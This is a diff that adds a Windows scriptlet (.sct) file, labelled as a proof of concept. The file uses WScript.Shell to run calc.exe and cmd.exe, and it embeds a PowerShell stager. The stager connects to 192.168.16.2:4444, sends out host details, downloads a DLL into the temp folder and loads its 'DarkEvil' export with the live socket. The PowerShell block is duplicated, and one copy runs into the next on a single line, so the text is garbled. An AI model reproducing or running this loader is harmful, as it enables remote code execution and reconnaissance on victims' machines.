@@ -1,0 +1,188 @@
+<?xml version="1.0"?>
+<scriptlet>
+  <registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+  >
+    <!-- Proof Of Concept - Casey Smith @subTee -->
+    <script language="JScript">
+      <![CDATA[
+        var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+      ]]>
+    </script>
+  </registration>
+
+  <public>
+    <method name="Exec"></method>
+  </public>
+
+  <script language="JScript">
+    <![CDATA[
+      function Exec()
+      {
+        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+      }
+    ]]>
+  </script>
+
+  <!-- Add a new script element for PowerShell code -->
+  <script language="PowerShell">
+    <![CDATA[
+		$ip = "192.168.16.2"
+		$port = 4444
+
+		Write-Host "IP address: $ip"
+		Write-Host "Port number: $port"
+		try {
+			$socket = New-Object System.Net.Sockets.TcpClient($ip, $port)
+			Write-Host "Connection successful"
+		}
+		catch {
+			break
+		}
+		$computername = $env:COMPUTERNAME
+
+		$processArch = ""
+
+		$architecture = $env:PROCESSOR_ARCHITECTURE
+		if ($architecture -eq "AMD64") {
+			$processArch = "x64-bit"
+			Write-Host "64-bit"
+		} elseif ($architecture -eq "x86") {
+			$processArch = "x32-bit"
+			Write-Host "32-bit"
+		} else {
+			Write-Host "Unknown"
+		}
+
+
+		$osname = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+		$client_type = "Powershell"
+		$machine_info = $computername + ":" + $processArch + ":" + $osname + ":" + $client_type
+		Write-Host $machine_info
+		$send_machine_info = [System.Text.Encoding]::ASCII.GetBytes($machine_info)
+		$socket.GetStream().Write($send_machine_info, 0, $send_machine_info.Length)
+		$buffer = New-Object byte[] 4096
+		$randomNumber = Get-Random -Minimum 1 -Maximum 1000
+		$guid = [guid]::NewGuid().ToString()
+		$fileName = "download_${randomNumber}_${guid}.dll"
+		$tempFolder = [System.IO.Path]::GetTempPath()
+		$fileStream = [System.IO.File]::Create("$tempFolder\$fileName")
+		$receivedBytes = $socket.GetStream().Read($buffer, 0, $buffer.Length)
+		$response = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $receivedBytes)
+		$fileSize = [System.Int32]::Parse($response)
+		$msg = "send_dll"
+		$sendmsg = [System.Text.Encoding]::ASCII.GetBytes($msg)
+		$socket.GetStream().Write($sendmsg, 0, $sendmsg.Length)
+		$totalBytes = 0
+		while ($totalBytes -lt $fileSize) {
+			try {
+				
+				$bytesRead = $socket.GetStream().Read($buffer, 0, $buffer.Length)
+
+				if ($bytesRead -gt 0) {
+					
+					$fileStream.Write($buffer, 0, $bytesRead)
+					$fileStream.Flush()
+
+					$totalBytes += $bytesRead
+
+					if ($totalBytes -ge $fileSize) {
+						break
+					}
+				}
+			}
+			catch {
+				Write-Host "An error occurred while receiving data from the socket: $($_.Exception.Message)"
+				break
+			}
+		}
+
+		$fileStream.Close()
+		$fullPath = Join-Path $tempFolder $fileName
+		$fullPath = $fullPath.Replace("\", "\\")
+		$signature = @'[DllImport("$fullPath", EntryPoint="DarkEvil")]; public static extern int DarkEvil(IntPtr socket);'@
+		$LoadDLL = Add-Type -MemberDefinition $signature -Name "LoadDLL" -Namespace "LoadDLL" -PassThru
+		$handle = $socket.Client.Handle
+		$LoadDLL::DarkEvil($handle)$ip = "192.168.16.2"
+		$port = 4444
+
+		Write-Host "IP address: $ip"
+		Write-Host "Port number: $port"
+		try {
+			$socket = New-Object System.Net.Sockets.TcpClient($ip, $port)
+			Write-Host "Connection successful"
+		}
+		catch {
+			break
+		}
+		$computername = $env:COMPUTERNAME
+
+		$processArch = ""
+
+		$architecture = $env:PROCESSOR_ARCHITECTURE
+		if ($architecture -eq "AMD64") {
+			$processArch = "x64-bit"
+			Write-Host "64-bit"
+		} elseif ($architecture -eq "x86") {
+			$processArch = "x32-bit"
+			Write-Host "32-bit"
+		} else {
+			Write-Host "Unknown"
+		}
+
+
+		$osname = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+		$client_type = "Powershell"
+		$machine_info = $computername + ":" + $processArch + ":" + $osname + ":" + $client_type
+		Write-Host $machine_info
+		$send_machine_info = [System.Text.Encoding]::ASCII.GetBytes($machine_info)
+		$socket.GetStream().Write($send_machine_info, 0, $send_machine_info.Length)
+		$buffer = New-Object byte[] 4096
+		$randomNumber = Get-Random -Minimum 1 -Maximum 1000
+		$guid = [guid]::NewGuid().ToString()
+		$fileName = "download_${randomNumber}_${guid}.dll"
+		$tempFolder = [System.IO.Path]::GetTempPath()
+		$fileStream = [System.IO.File]::Create("$tempFolder\$fileName")
+		$receivedBytes = $socket.GetStream().Read($buffer, 0, $buffer.Length)
+		$response = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $receivedBytes)
+		$fileSize = [System.Int32]::Parse($response)
+		$msg = "send_dll"
+		$sendmsg = [System.Text.Encoding]::ASCII.GetBytes($msg)
+		$socket.GetStream().Write($sendmsg, 0, $sendmsg.Length)
+		$totalBytes = 0
+		while ($totalBytes -lt $fileSize) {
+			try {
+				
+				$bytesRead = $socket.GetStream().Read($buffer, 0, $buffer.Length)
+
+				if ($bytesRead -gt 0) {
+					
+					$fileStream.Write($buffer, 0, $bytesRead)
+					$fileStream.Flush()
+
+					$totalBytes += $bytesRead
+
+					if ($totalBytes -ge $fileSize) {
+						break
+					}
+				}
+			}
+			catch {
+				Write-Host "An error occurred while receiving data from the socket: $($_.Exception.Message)"
+				break
+			}
+		}
+
+		$fileStream.Close()
+		$fullPath = Join-Path $tempFolder $fileName
+		$fullPath = $fullPath.Replace("\", "\\")
+		$signature = @'[DllImport("$fullPath", EntryPoint="DarkEvil")]; public static extern int DarkEvil(IntPtr socket);'@
+		$LoadDLL = Add-Type -MemberDefinition $signature -Name "LoadDLL" -Namespace "LoadDLL" -PassThru
+		$handle = $socket.Client.Handle
+		$LoadDLL::DarkEvil($handle)
+    ]]>
+  </script>
+</scriptlet>
